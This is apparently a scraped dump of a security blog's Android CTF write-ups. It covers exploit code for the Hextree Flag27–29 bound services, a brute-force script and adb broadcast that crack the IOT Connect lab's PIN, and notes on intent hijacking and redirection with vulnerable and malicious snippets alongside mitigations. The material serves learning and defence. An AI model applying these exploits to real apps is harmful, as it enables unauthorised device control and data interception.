Flag27Service.this.sendReply(message, \u0026#34;Error\u0026#34;); return; } Message obtain = Message.obtain((Handler) null, message.what); Bundle bundle = new Bundle(); String uuid = UUID.randomUUID().toString(); this.password = uuid; bundle.putString(\u0026#34;password\u0026#34;, uuid); obtain.setData(bundle); try { message.replyTo.send(obtain); Flag27Service.this.sendReply(message, \u0026#34;Password\u0026#34;); } catch (RemoteException e) { throw new RuntimeException(e); } } } case = 2 : if message object is not null it will generates a random UUID as a password then Sends the password back to the us via message.replyTo. public void sendReply(Message message, String str) { try { Message obtain = Message.obtain((Handler) null, message.what); obtain.getData().putString(\u0026#34;reply\u0026#34;, str); message.replyTo.send(obtain); } catch (RemoteException e) { e.printStackTrace(); } } Sends a reply back to the client using message.replyTo. The reply contains: The same what value as the original message. A reply string in the Bundle. Solution # we need to create a connection to service and obtain the result with value 2 to get password then we will use it and send it along with echo and we will use IncomingMessageHandle() to send message content\nprivate static Messenger serviceMessenger = null; private static String obtainedPassword; private static final Messenger clientMessegener = new Messenger(new services.IncomingMessageHandle()); private ServiceConnection serviceConnection2 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder binder) { serviceMessenger = new Messenger(binder); Message msg = Message.obtain(null, 2); msg.obj = new Bundle(); msg.replyTo = new Messenger(new IncomingMessageHandle()); try{ serviceMessenger.send(msg); } catch (RemoteException e){ throw new RuntimeException(e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; static class IncomingMessageHandle extends Handler { IncomingMessageHandle() {super(Looper.getMainLooper());} @Override public void handleMessage(Message msg) { Bundle reply = msg.getData(); obtainedPassword = reply.getString(\u0026#34;password\u0026#34;); if(reply != null \u0026amp;\u0026amp; obtainedPassword != null) { Log.i(\u0026#34;msg\u0026#34;, reply.toString()); Log.d(\u0026#34;password\u0026#34;, \u0026#34;Obtained password: \u0026#34; + obtainedPassword); msg = Message.obtain(null, 1); Bundle bundle = new Bundle(); bundle.putString(\u0026#34;echo\u0026#34;, \u0026#34;give flag\u0026#34;); msg.setData(bundle); msg.replyTo = clientMessegener; try { serviceMessenger.send(msg); } catch (RemoteException e) { e.printStackTrace(); } msg = Message.obtain(null, 3); bundle = new Bundle(); bundle.putString(\u0026#34;password\u0026#34;, obtainedPassword); msg.setData(bundle); msg.replyTo = clientMessegener; try { serviceMessenger.send(msg); } catch (RemoteException e) { e.printStackTrace(); } } else{ Log.i(\u0026#34;X\u0026#34;, \u0026#34;NO Reply\u0026#34;); } } } Intent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag27Service\u0026#34;); bindService(send,serviceConnection2, Context.BIND_AUTO_CREATE); Flag 28 # Code analysis # package io.hextree.attacksurface.services; private final IFlag28Interface.Stub binder = new IFlag28Interface.Stub() { @Override // io.hextree.attacksurface.services.IFlag28Interface public boolean openFlag() throws RemoteException { return success(); } public boolean success() { Intent intent = new Intent(); intent.setClass(Flag28Service.this, Flag28Activity.class); intent.putExtra(\u0026#34;secret\u0026#34;, Flag28Service.secret); intent.addFlags(268468224); intent.putExtra(\u0026#34;hideIntent\u0026#34;, true); Flag28Service.this.startActivity(intent); return true; } }; by looking at the onBind() method that returns some kind of .Stub binder Which means we are dealing with AIDL file, Looking more we can see that it only implements a single method of type Boolean that just by calling The method we get success called\nSolution # In order for our app to call this method it needs to know it in the first place right? so reversing the aidl we get\nDefining the file # // IFlag28Interface.aidl package io.hextree.attacksurface.services; interface IFlag28Interface { boolean openFlag(); } now creating a connection to service and using IFlag28Interface to get access to methods in it we call openFlag\nIntent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag28Service\u0026#34;); ServiceConnection serviceConnection3 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { IFlag28Interface remoteService = IFlag28Interface.Stub.asInterface(service); try { remoteService.openFlag(); } catch (RemoteException e) { throw new RuntimeException(e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; bindService(send,serviceConnection3, Context.BIND_AUTO_CREATE); Class loading # Intent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag28Service\u0026#34;); ServiceConnection serviceConnection4 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { // Load the class dynamically ClassLoader classLoader = null; try { classLoader = services.this.createPackageContext(\u0026#34;io.hextree.attacksurface\u0026#34;, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY).getClassLoader(); Class\u0026lt;?\u0026gt; iRemoteServiceClass; // Load the AIDL interface class iRemoteServiceClass = classLoader.loadClass(\u0026#34;io.hextree.attacksurface.services.IFlag28Interface\u0026#34;); Class\u0026lt;?\u0026gt; stubClass = null; for (Class\u0026lt;?\u0026gt; innerClass : iRemoteServiceClass.getDeclaredClasses()) { if (innerClass.getSimpleName().equals(\u0026#34;Stub\u0026#34;)) { stubClass = innerClass; break; } } // Get the asInterface method Method asInterfaceMethod = stubClass.getDeclaredMethod(\u0026#34;asInterface\u0026#34;, IBinder.class); // Invoke the asInterface method to get the instance of IRemoteService Object iRemoteService = asInterfaceMethod.invoke(null, service); // Call the init method and get the returned string Method openFlagMethod = iRemoteServiceClass.getDeclaredMethod(\u0026#34;openFlag\u0026#34;); boolean initResult = (boolean) openFlagMethod.invoke(iRemoteService); } catch (Exception e) { Log.e(\u0026#34;Flag29Service\u0026#34;, \u0026#34;Error creating package context\u0026#34;, e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; bindService(send,serviceConnection4, Context.BIND_AUTO_CREATE); Flag 29 # Code analysis # package io.hextree.attacksurface.services; private final IFlag29Interface.Stub binder = new IFlag29Interface.Stub() { Intent intent = new Intent(); @Override // io.hextree.attacksurface.services.IFlag29Interface public String init() throws RemoteException { Log.i(\u0026#34;Flag29\u0026#34;, \u0026#34;service.init()\u0026#34;); return this.pw; } @Override // io.hextree.attacksurface.services.IFlag29Interface public void authenticate(String str) throws RemoteException { Log.i(\u0026#34;Flag29\u0026#34;, \u0026#34;service.authenticate(\u0026#34; + str + \u0026#34;)\u0026#34;); if (str.equals(this.pw)) { this.intent.putExtra(\u0026#34;authenticated\u0026#34;, true); } else { this.intent.removeExtra(\u0026#34;authenticated\u0026#34;); } } @Override // io.hextree.attacksurface.services.IFlag29Interface public void success() throws RemoteException { Log.i(\u0026#34;Flag29\u0026#34;, \u0026#34;service.success()\u0026#34;); this.intent.setClass(Flag29Service.this, Flag29Activity.class); if (this.intent.getBooleanExtra(\u0026#34;authenticated\u0026#34;, false)) { this.intent.putExtra(\u0026#34;secret\u0026#34;, Flag29Service.secret); this.intent.addFlags(268435456); this.intent.putExtra(\u0026#34;hideIntent\u0026#34;, true); Flag29Service.this.startActivity(this.intent); } } }; The service uses init() to initiate flag29 and return a string then authenticate takes a string and if that string is the same an authenticated string is added to intent along with true value\npublic interface IFlag29Interface extends IInterface { public static final String DESCRIPTOR = \u0026#34;io.hextree.attacksurface.services.IFlag29Interface\u0026#34;; public static class Default implements IFlag29Interface { @Override // android.os.IInterface public IBinder asBinder() { return null; } //our 3 methods @Override // io.hextree.attacksurface.services.IFlag29Interface public void authenticate(String str) throws RemoteException { } @Override // io.hextree.attacksurface.services.IFlag29Interface public String init() throws RemoteException { return null; } @Override // io.hextree.attacksurface.services.IFlag29Interface public void success() throws RemoteException { } } public static abstract class Stub extends Binder implements IFlag29Interface { static final int TRANSACTION_authenticate = 2; static final int TRANSACTION_init = 1; static final int TRANSACTION_success = 3; okay now from here we have the DESCRIPTOR and the order of methods should be\ninit() authenticate() success() Solution # Defining the file # Now creating the aidl file with the order in mind we get\n// IFlag29Interface.aidl package io.hextree.attacksurface.services; interface IFlag29Interface { String init(); void authenticate(String str); void success(); } then in our app we create a service connection using IFlag29Interface and calling init() while saving the string returned in pass then passing it to authenticate() and finally calling success()\nIntent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag29Service\u0026#34;); ServiceConnection serviceConnection4 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { IFlag29Interface remoteService = IFlag29Interface.Stub.asInterface(service); try { String pass = remoteService.init(); remoteService.authenticate(pass); remoteService.success(); } catch (RemoteException e) { throw new RuntimeException(e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; bindService(send,serviceConnection4, Context.BIND_AUTO_CREATE); Class loading # Intent send = new Intent(); send.setClassName(\u0026#34;io.hextree.attacksurface\u0026#34;, \u0026#34;io.hextree.attacksurface.services.Flag29Service\u0026#34;); ServiceConnection serviceConnection4 = new ServiceConnection() { @Override public void onServiceConnected(ComponentName name, IBinder service) { // Load the class dynamically ClassLoader classLoader = null; try { classLoader = services.this.createPackageContext(\u0026#34;io.hextree.attacksurface\u0026#34;, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY).getClassLoader(); Class\u0026lt;?\u0026gt; iRemoteServiceClass; // Load the AIDL interface class iRemoteServiceClass = classLoader.loadClass(\u0026#34;io.hextree.attacksurface.services.IFlag29Interface\u0026#34;); Class\u0026lt;?\u0026gt; stubClass = null; for (Class\u0026lt;?\u0026gt; innerClass : iRemoteServiceClass.getDeclaredClasses()) { if (innerClass.getSimpleName().equals(\u0026#34;Stub\u0026#34;)) { stubClass = innerClass; break; } } // Get the asInterface method Method asInterfaceMethod = stubClass.getDeclaredMethod(\u0026#34;asInterface\u0026#34;, IBinder.class); // Invoke the asInterface method to get the instance of IRemoteService Object iRemoteService = asInterfaceMethod.invoke(null, service); // Call the init method and get the returned string Method initMethod = iRemoteServiceClass.getDeclaredMethod(\u0026#34;init\u0026#34;); String password = (String) initMethod.invoke(iRemoteService); Log.d(\u0026#34;Flag29Service\u0026#34;, \u0026#34;Password: \u0026#34; + password); // Call the authenticate method with the password Method authenticateMethod = iRemoteServiceClass.getDeclaredMethod(\u0026#34;authenticate\u0026#34;, String.class); authenticateMethod.invoke(iRemoteService, password); // Call the success method Method successMethod = iRemoteServiceClass.getDeclaredMethod(\u0026#34;success\u0026#34;); successMethod.invoke(iRemoteService); } catch (Exception e) { Log.e(\u0026#34;Flag29Service\u0026#34;, \u0026#34;Error creating package context\u0026#34;, e); } } @Override public void onServiceDisconnected(ComponentName name) { } }; bindService(send,serviceConnection4, Context.BIND_AUTO_CREATE); ","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/posts/ctf/mobile/hex/hex_services/","section":"","summary":"","title":"HEX Tree Services Challenges","type":"posts"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/hextree/","section":"Tags","summary":"","title":"Hextree","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/implicit/","section":"Tags","summary":"","title":"Implicit","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/intent/","section":"Tags","summary":"","title":"Intent","type":"tags"},{"content":"Android Broadcast Receiver Challenge\nüéØ Goal # This challenge focuses on exploiting a security flaw related to the Broadcast Receiver in the IOT Connect application. The flaw allows unauthorized users to activate the master switch, which turns on all connected devices.\nThe goal is to send a broadcast in a way that only authenticated users should be able to trigger the master switch.\nAnalysis # Exported from manifest # Activities # LoginActivity\nEntry point of the app (MAIN/LAUNCHER intent filter) SignupActivity\nMainActivity\nBroadcast Receivers # MasterReceiver\nHandles custom \u0026ldquo;MASTER_ON\u0026rdquo; broadcasts No permission protection ProfileInstallReceiver (AndroidX component)\nHandles profile installer operations (INSTALL_PROFILE, SKIP_FILE, etc.) Protected by android.permission.DUMP (signature-level permission) Exported but with permission requirement Moving on # Now after playing around with the app we understand that:\nyou can create and interact with the app as new user new users (guests) can\u0026rsquo;t try to run master key even if you have the correct 3-digit pin ![[Pasted image 20250715015025.png]]\nwhen searching for MasterReceiver receiver we find it dynamically implemented but not in a class names MasterReceiver but in CommunicationManager and that will cause us a minor problem in the future but now lets see what we have\nCode Deep Dive # public final BroadcastReceiver initialize(Context context) { masterReceiver = new BroadcastReceiver() { public void onReceive(Context context2, Intent intent) { if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, \u0026#34;MASTER_ON\u0026#34;)) { int key = intent.getIntExtra(\u0026#34;key\u0026#34;, 0); if (context2 != null) { if (Checker.INSTANCE.check_key(key)) { CommunicationManager.INSTANCE.turnOnAllDevices(context2); Toast.makeText(context2, \u0026#34;All devices are turned on\u0026#34;, 1).show(); } else { Toast.makeText(context2, \u0026#34;Wrong PIN!!\u0026#34;, 1).show(); } } } } }; BroadcastReceiver broadcastReceiver = masterReceiver; if (broadcastReceiver == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;masterReceiver\u0026#34;); broadcastReceiver = null; } context.registerReceiver(broadcastReceiver, new IntentFilter(\u0026#34;MASTER_ON\u0026#34;)); BroadcastReceiver broadcastReceiver2 = masterReceiver; if (broadcastReceiver2 != null) { return broadcastReceiver2; } Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;masterReceiver\u0026#34;); return null; so the class has a masterReceiver that will check for action: MASTER_ON as we know but it also wants aother requirement a key . going deeper and seeing this method Checker.INSTANCE.check_key() we find this lovely AES implementation\npublic final class Checker { public static final Checker INSTANCE = new Checker(); private static final String algorithm = \u0026#34;AES\u0026#34;; private static final String ds = \u0026#34;OSnaALIWUkpOziVAMycaZQ==\u0026#34;; private Checker() { } public final boolean check_key(int key) { try { return Intrinsics.areEqual(decrypt(ds, key), \u0026#34;master_on\u0026#34;); } catch (BadPaddingException e) { return false; } } public final String decrypt(String ds2, int key) { Intrinsics.checkNotNullParameter(ds2, \u0026#34;ds\u0026#34;); SecretKeySpec secretKey = generateKey(key); Cipher cipher = Cipher.getInstance(algorithm + \u0026#34;/ECB/PKCS5Padding\u0026#34;); cipher.init(2, secretKey); if (Build.VERSION.SDK_INT \u0026gt;= 26) { byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2)); Intrinsics.checkNotNull(decryptedBytes); return new String(decryptedBytes, Charsets.UTF_8); } throw new UnsupportedOperationException(\u0026#34;VERSION.SDK_INT \u0026lt; O\u0026#34;); } private final SecretKeySpec generateKey(int staticKey) { byte[] keyBytes = new byte[16]; byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8); Intrinsics.checkNotNullExpressionValue(staticKeyBytes, \u0026#34;getBytes(...)\u0026#34;); System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length)); return new SecretKeySpec(keyBytes, algorithm); } } This code implements a simple encryption checker that checks if the provided integer key can correctly decrypt a hardcoded ciphertext to produce the string \u0026ldquo;master_on\u0026rdquo;. sooo\nIn short # Algorithm \u0026amp; Mode: Uses AES/ECB/PKCS5Padding Hardcoded Data: Ciphertext (ds): \u0026quot;OSnaALIWUkpOziVAMycaZQ==\u0026quot; (Base64-encoded) Expected plaintext: \u0026quot;master_on\u0026quot; and with that we have all the signs that tells us to brute force it\nCode Flow # check_key(int key):\nTakes an integer key Calls decrypt() with the hardcoded ciphertext (ds) and the key Compares the decrypted result with \u0026quot;master_on\u0026quot; decrypt(String ds2, int key):\nGenerates an AES key from the integer key (generateKey(key)) Initializes a cipher in decryption mode (2 = Cipher.DECRYPT_MODE) Decodes the Base64 ciphertext and decrypts it using AES/ECB Returns the decrypted string (UTF-8) generateKey(int staticKey):\nConverts the integer key to a UTF-8 byte array Copies it into a 16-byte key (AES-128 requires 128-bit keys) If the key is shorter than 16 bytes, the remaining bytes are 0 (due to System.arraycopy) The problem # Weak Cryptography\nUses AES/ECB mode (deterministic) 3-digit PIN ‚Üí 1000 possible keys (bruteforceable) Hardcoded ciphertext (OSnaALIWUkpOziVAMycaZQ==) Insecure Broadcast\nNo permission protection No sender verification Exploitation # After some time like figuring out how to actually decode AES in python \u0026hellip;\u0026hellip; FINALY i ended up with this string\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import unpad import base64 cipherTxT = \u0026#34;OSnaALIWUkpOziVAMycaZQ==\u0026#34; # Base64-encoded ciphertext PlainTxT = \u0026#34;master_on\u0026#34; def num_gen(): arr = [] digits = 3 # Number of digits format_str = f\u0026#34;{{:0{digits}d}}\u0026#34; for number in range(0, 1000): arr.append(format_str.format(number)) return arr def generate_key(pin): pin_str = str(pin) key_bytes = pin_str.encode(\u0026#39;utf-8\u0026#39;).ljust(16, b\u0026#39;\\x00\u0026#39;)[:16] # Pad to 16 bytes return key_bytes def decrypt(ciphertext, plaintext): ciphertext = base64.b64decode(cipherTxT) for pin in range(0,1000): real_pins = num_gen() key = generate_key(real_pins[pin]) cipher = AES.new(key, AES.MODE_ECB) try: decrypted = cipher.decrypt(ciphertext) decrypted = unpad(decrypted, AES.block_size) decrypted_str = decrypted.decode(\u0026#39;utf-8\u0026#39;) if decrypted_str == plaintext: print(f\u0026#34;\\nSUCCESS! Found PIN: {pin:03d}\u0026#34;) print(f\u0026#34;Decrypted text: \u0026#39;{decrypted_str}\u0026#39;\u0026#34;) print(f\u0026#34;Key used: {key.hex()}\u0026#34;) return pin except Exception as e: continue print(\u0026#34;\\nNo matching PIN found\u0026#34;) return None if __name__ == \u0026#34;__main__\u0026#34;: found_pin = decrypt(cipherTxT, PlainTxT) if found_pin is not None: print(\u0026#34;YaY\u0026#34;) i created the code so that if the pin changes to like 5 digits it will only need small edits and in the future i can add multi threading to speed things up\nAND guess what !\nSUCCESS! Found PIN: 345 Decrypted text: \u0026#39;master_on\u0026#39; Key used: 33343500000000000000000000000000 YaY now what was i doing again ???? oh yeah back to the receiver\nso i will try to send broadcast with\npin = 345 action = MASTER_ON (FYI i forgot since this a dynamically registered receiver i wont need to specify class and package \u0026hellip;. since the class name used didn\u0026rsquo;t even exist \u0026hellip;. and yes i did this lab at like 3am and i need to sleep )\nAnd since we don\u0026rsquo;t need to specify class we can just fire our Poc and see what happens\nIntent intent = new Intent(); intent.setAction(\u0026#34;MASTER_ON\u0026#34;); intent.putExtra(\u0026#34;key\u0026#34;, 345); sendBroadcast(intent); or adb\nadb shell am broadcast -a \u0026#34;MASTER_ON\u0026#34; --ei key 345 AAAAAAAAAAANd done using logcat to verify that we actually succeeded an no error occurred in the background is the best feeling in the world\n![[Pasted image 20250715045535.png]]\nNote: If you are in the setup activity (where you on/off things) the solution wont be applied to the UI unless you returned and clicked the button again\nThx for reading JOYBOY out\n","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/posts/ctf/mobile/mobilehackinglab/iotconnect/iotconnect/","section":"","summary":"","title":"IOT Connect","type":"posts"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/","section":"JoyBoy","summary":"","title":"JoyBoy","type":"page"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/pending/","section":"Tags","summary":"","title":"Pending","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/tags/permissions/","section":"Tags","summary":"","title":"Permissions","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/tags/services/","section":"Tags","summary":"","title":"Services","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/tags/summary/","section":"Tags","summary":"","title":"Summary","type":"tags"},{"content":"","date":"30 ŸäŸàŸÑŸäŸà 2025","externalUrl":null,"permalink":"/superBLog/ar/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" Summary # A way to express what you want from specific/special android components, sometimes you want to give it an ACTION or put some Extra data that it can read and interpret (understand) and don\u0026rsquo;t forget to that you can set class that you cant to talk to wither its in same app class or different app hence why it\u0026rsquo;s named intention i guess XD .\n[!Who can you send it to?]\nActivities: Sent to start new activities within your app or other apps installed on the user\u0026rsquo;s device. Services: Communicate with background services running in your app or other apps. Broadcast Receivers: Intents can be broadcast by the system (or an app) and received by appropriate components registered to handle those intents. Content Providers: Used to interact with content providers, which manage shared data between applications. Fragments: Intents can be sent to start new fragments within your app. Custom Components: You can create custom components (e.g., views, widgets) that respond to specific intent actions and categories What intent looks like # Key Attributes of an Intent # An Intent object consists of several arguments that describe its purpose:\nIntent intent = new Intent(); intent.setAction(\u0026#34;android.intent.action.MAIN\u0026#34;); intent.setData(Uri.parse(\u0026#34;content://contacts/people/1\u0026#34;)); intent.setType(\u0026#34;text/plain\u0026#34;); intent.addCategory(\u0026#34;android.intent.category.LAUNCHER\u0026#34;); intent.setComponent(new ComponentName(\u0026#34;com.example.package\u0026#34;, \u0026#34;com.example.package.MainActivity\u0026#34;)); intent.setClass(); intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION); intent.putExtra(\u0026#34;EXTRA_KEY\u0026#34;, \u0026#34;Sample Value\u0026#34;); intent.putExtra(\u0026#34;ANOTHER_KEY\u0026#34;, 42); [!note] Important Categories\nDEFAULT category allows your app to respond to implicit intents Without DEFAULT, the activity can only be started with explicit component names [!Warning] You can only sent to any component (Implicit or Explicit) intent if it\u0026rsquo;s defined in the manifest file that exported its set to True\nTypes of Intent # 1. Explicit # Sending intent to a specific component\nspecify the exact Package (if in different app)\u0026amp; full class name of target and using setComponent() or setClass() Intent intent = new Intent(); intent.setComponent(new ComponentName(\u0026#34;com.example\u0026#34;, \u0026#34;com.example.MyActivity\u0026#34;)); //or intent.setClass(\u0026#34;com.example\u0026#34;, \u0026#34;com.example.MyActivity\u0026#34;) startActivity(intent); 2. Implicit # when you don\u0026rsquo;t know exactly what component you want to interact with, and Android will handle the routing based on the intent Action\ndoes not fully specify the target component (by package and class name). Instead, it contains some data, often just an action (like ACTION_SEND), which allows the Android system to find a matching component to handle the intent (through filters). If multiple matching components are found, the user might be presented with a selection dialog\nUsing setAction() for setting an action string. // Setting action Intent intent = new Intent(); intent.setAction(\u0026#34;com.example.ACTION\u0026#34;); startActivity(intent); Corresponding Intent Filter in Manifest:\n\u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;com.example.ACTION\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; Risks (Implicit intent hijacking): # vulnerability where a malicious application can intercept and potentially take over an implicit intent meant for another application, this allows a malicious application to register an intent filter to intercept the intent instead of the intended application.\nDepending on the intent content, attackers could read or modify sensitive information or interact with mutable objects, such as mutable PendingIntents or Binders.\nMitigation : # Unless the application requires it, make intents explicit by calling setPackage(). This allows only by a specific component . preventing untrusted applications from intercepting the data sent along with the intent. The following snippet shows how to make an intent explicit:\nIntent intent = new Intent(\u0026#34;android.intent.action.CREATE_DOCUMENT\u0026#34;); intent.addCategory(\u0026#34;android.intent.category.OPENABLE\u0026#34;); intent.setPackage(\u0026#34;com.some.packagename\u0026#34;); intent.setType(\u0026#34;*/*\u0026#34;); intent.putExtra(\u0026#34;android.intent.extra.LOCAL_ONLY\u0026#34;, true); intent.putExtra(\u0026#34;android.intent.extra.TITLE\u0026#34;, \u0026#34;Some Title\u0026#34;); startActivity(intent); for more go to [[Implicit intent hijacking]] more attacks\nIntent Attacks \u0026amp; Mitigation # Implicit Intent Hijacking # [!danger] Malicious applications can intercept implicit intents by registering matching intent filters, allowing them to read or modify sensitive information.\nAttack Scenarios:\nInsecure Broadcasts Messaging apps broadcasting implicitly can be intercepted All implicit broadcasts are delivered to every registered receiver across all apps Insecure Activity Launches Banking apps sharing credit card details via implicit intents Malicious apps can manipulate their position in Activity Chooser using android:priority Return Value Attacks (startActivityForResult()) Intercepting apps can use setResult() to return crafted data Commonly leads to arbitrary file/image theft Attackers return URIs pointing to private directory files File Overwrite Attacks Path-traversal characters in filenames (e.g., ../lib.so) Can lead to arbitrary code execution if files are written to critical locations The attacker can control the position of his app in the list using the android:priority=\u0026quot;num\u0026quot; attribute in the \u0026lt;intent-filter\u0026gt; declaration The attacker can thus intercept credit intent as follows\n\u0026lt;activity android:name=\u0026#34;.EvilActivity\u0026#34;\u0026gt; \u0026lt;intent-filter android:priority=\u0026#34;999\u0026#34;\u0026gt; \u0026lt;action android:name=\u0026#34;com.victim.ADD_CARD_ACTION\u0026#34; /\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34; /\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; Intent Redirection # [!danger] One app component receives an intent and forwards it to another component without proper validation.\nVulnerable Pattern:\nAttack Activity (malicious app) ‚Üí Proxy Activity (vulnerable app) ‚Üí Protected Target Activity Common Vulnerability:\n// Vulnerable code - no validation Parcelable extraIntent = getIntent().getParcelableExtra(\u0026#34;extra_intent\u0026#34;); if (extraIntent instanceof Intent) { startActivity((Intent) extraIntent); // Dangerous! } OR\nIntent intent = getIntent(); Intent nextIntent = (Intent) intent.getParcelableExtra(\u0026#34;nextIntent\u0026#34;); if (this.nextIntent.getStringExtra(\u0026#34;reason\u0026#34;).equals(\u0026#34;next\u0026#34;)) { startActivity(this.nextIntent); } That can lead to :\nOpen Redirect - Malicious URLs routed through proxy Local File Inclusion (LFI) - Access to local files if WebView has universal access enabled Protected FileProvider Access - Access non-exported ContentProviders mitigation # 1. Validate Intent Destinations # verify where intents are being redirected before forwarding them:\nIntent intent = getIntent(); // Get the component name of the nested intent Intent forward = (Intent) intent.getParcelableExtra(\u0026#34;key\u0026#34;); ComponentName name = forward.resolveActivity(getPackageManager()); // Check that the package name and class name contain the expected values if (name.getPackageName().equals(\u0026#34;safe_package\u0026#34;) \u0026amp;\u0026amp; name.getClassName().equals(\u0026#34;safe_class\u0026#34;)) { // Redirect the nested intent startActivity(forward); } 2. Use Pending Intent Objects # Pending Intents prevent component export and make target actions immutable to send intents that can\u0026rsquo;t be tampered with\n// Create immutable PendingIntent PendingIntent pendingIntent = PendingIntent.getActivity( getContext(), 0, new Intent(intentAction), PendingIntent.FLAG_IMMUTABLE ); // Ensure explicit component targeting Intent intent = new Intent(intentAction); intent.setClassName(packageName, className); PendingIntent pendingIntent = PendingIntent.getActivity( getContext(), 0, intent, PendingIntent.FLAG_IMMUTABLE ); 3. Implement IntentSanitizer # Use IntentSanitizer to create sanitized copies of intents with allowlisted components and data:\nIntent sanitizedIntent = new IntentSanitizer.Builder() .allowComponent(\u0026#34;com.example.ActivityA\u0026#34;) .allowData(\u0026#34;com.example\u0026#34;) .allowType(\u0026#34;text/plain\u0026#34;) .build() .sanitizeByThrowing(intent); 4. Explicit Intent Usage # Use explicit intents for sensitive operations to control component targeting:\nIntent intent = new Intent(\u0026#34;android.intent.action.CREATE_DOCUMENT\u0026#34;); intent.addCategory(\u0026#34;android.intent.category.OPENABLE\u0026#34;); intent.setPackage(\u0026#34;com.some.packagename\u0026#34;); // Explicitly set package intent.setType(\u0026#34;*/*\u0026#34;); startActivity(intent); 5. Dynamic determination of intent receivers # Some apps try to stop the activity picker appearing by automatically determining a single recipient and setting it in the intent settings (which is also very common when launching services, since implicit intents are forbidden in service launch)\nIntent intent = new Intent(\u0026#34;com.victim.ADD_CARD_ACTION\u0026#34;); intent.putExtra(\u0026#34;credit_card_number\u0026#34;, num.getText().toString()); intent.putExtra(\u0026#34;holder_name\u0026#34;, name.getText().toString()); //... for (ResolveInfo info : getPackageManager().queryIntentActivities(intent, 0)) { intent.setClassName(info.activityInfo.packageName, info.activityInfo.name); startActivity(intent); return; } this is more advantageous, because it eliminates the need for user interaction and automatically specifies the attacker‚Äôs activity\n6. Minimize component exposure and implement proper permissions: # \u0026lt;!-- Avoid exporting components unless necessary --\u0026gt; \u0026lt;activity android:name=\u0026#34;.MyActivity\u0026#34; android:exported=\u0026#34;false\u0026#34;/\u0026gt; // Enforce permissions at code level public class MyExportService extends Service { @Override public IBinder onBind(Intent intent) { enforceCallingPermission(Manifest.permission.READ_CONTACTS, \u0026#34;Calling app doesn\u0026#39;t have READ_CONTACTS permission.\u0026#34;); return binder; } } Receiving Intent Results # getIntent() # Intent recivedIntent = getIntent(); String action = recivedIntent.getAction(); // now access it //to return a result when using onActivityResult recivedIntent.putExtra(\u0026#34;token\u0026#34;,1094795585); setResult(RESULT_OK, recivedIntent); finish(); Legacy: onActivityResult() # Intent intent = new Intent(this, MessageActivity.class); intent.putExtra(EXTRA_MESSAGE, message); startActivityForResult(intent, ACTIVITY_ID01); @Override protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == ACTIVITY_ID01) { // Process data from activity 1 if (resultCode == RESULT_OK \u0026amp;\u0026amp; data != null) { String token = data.getStringExtra(\u0026#34;token\u0026#34;); // Handle result } } } Modern: registerForActivityResult() # ActivityResultLauncher\u0026lt;Intent\u0026gt; activityLauncher = registerForActivityResult( new ActivityResultContracts.StartActivityForResult(), result -\u0026gt; { if (result.getResultCode() == RESULT_OK) { Intent data = result.getData(); if (data != null) { // Process result data String token = data.getStringExtra(\u0026#34;token\u0026#34;); } } } ); // Launch activity Intent intent = new Intent(this, TargetActivity.class); activityLauncher.launch(intent); Returning Results # // In the called activity Intent resultIntent = getIntent(); resultIntent.putExtra(\u0026#34;token\u0026#34;, \u0026#34;1094795585\u0026#34;); 